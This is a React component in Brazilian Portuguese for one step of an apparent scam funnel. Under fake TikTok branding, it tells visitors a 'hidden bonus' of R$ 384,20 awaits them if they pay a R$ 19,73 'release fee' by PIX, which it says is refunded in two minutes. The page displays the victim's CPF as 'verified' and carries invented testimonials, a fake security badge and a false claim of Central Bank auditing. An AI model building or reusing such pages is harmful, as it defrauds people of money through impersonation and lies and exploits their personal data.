import { useState } from "react";
import { Loader2, ChevronDown, ChevronUp } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";
import FunnelSecurityBadge from "./FunnelSecurityBadge";
import FunnelActiveUsersCounter from "./FunnelActiveUsersCounter";

interface FunnelUpsellBonusOcultoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }

const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="bg-white rounded-lg border border-gray-100 overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>{open && <div className="px-3 pb-3 pt-0"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}</div>); };
const TestimonialCard = ({ img, name, location, text, amount }: { img: string; name: string; location: string; text: string; amount: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} className="w-8 h-8 rounded-full object-cover" loading="lazy" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold">+{amount}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);

const FunnelUpsellBonusOculto = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellBonusOcultoProps) => {
  return (
    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
      <div className="bg-[#FE2C55] py-3 flex justify-center"><img src={tiktokLogo} alt="TikTok" className="h-5 w-auto brightness-0 invert" /></div>
      <main className="px-3 py-4 max-w-lg mx-auto">
        {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-[#FFF8E1] border border-[#FFD54F] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">🎁</span><div><p className="text-gray-900 text-sm font-bold mb-1">Saldo Oculto Detectado</p><p className="text-gray-700 text-xs leading-relaxed">Crédito adicional retido no módulo de conciliação.</p></div></div></div>
        <div className="bg-white rounded-xl p-5 shadow-sm mb-3">
          <div className="bg-gradient-to-r from-[#FFF8E1] to-[#FFF3E0] rounded-lg p-4 mb-4 border border-amber-100"><p className="text-gray-500 text-[10px] text-center mb-1">BÔNUS OCULTO</p><p className="text-2xl font-black text-center text-gray-900">R$ 384,20</p><p className="text-green-600 text-[10px] text-center font-semibold mt-1">Será somado ao seu saldo de {balance}</p></div>
          <div className="bg-gray-50 rounded-lg p-3 mb-4 border border-gray-100"><div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-[11px]">Taxa de liberação:</span><span className="text-gray-900 text-sm font-bold">R$ 19,73</span></div><div className="flex items-center justify-between"><span className="text-gray-500 text-[11px]">Reembolso:</span><span className="text-green-600 text-[11px] font-bold">✓ Em até 2 min</span></div></div>
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-3.5 rounded-xl bg-[#FE2C55] text-white font-bold text-sm tracking-wide hover:brightness-105 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-red-200" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>{isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : "Liberar Bônus de R$ 384,20 →"}</button>
          <FunnelSecurityBadge />
        </div>
        <FunnelActiveUsersCounter />
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="O que é o bônus oculto?" answer="Créditos de campanhas anteriores retidos no módulo de conciliação." /><FaqItem question="A taxa é reembolsável?" answer="Sim, 100%. Devolvida em até 2 minutos." /></div></div>
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem liberou, recebeu</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Mariana S." location="Recife, PE" text="Paguei a taxa e em 1 minuto caiu tudo no PIX." amount="R$ 384,20" /><TestimonialCard img={testimonial2} name="Carlos A." location="Belo Horizonte, MG" text="A taxa voltou e o bônus caiu junto com o saldo." amount="R$ 384,20" /><TestimonialCard img={testimonial3} name="Juliana R." location="Curitiba, PR" text="Liberei na hora e recebi tudo certinho." amount="R$ 384,20" /></div></div>
        <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Sistema auditado pelo Banco Central</p></div>
      </main>
      <style>{`@keyframes ctaPulse { 0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(254,44,85,0.3); } 50% { transform: scale(1.02); box-shadow: 0 6px 25px rgba(254,44,85,0.5); } }`}</style>
    </div>
  );
};

export default FunnelUpsellBonusOculto;
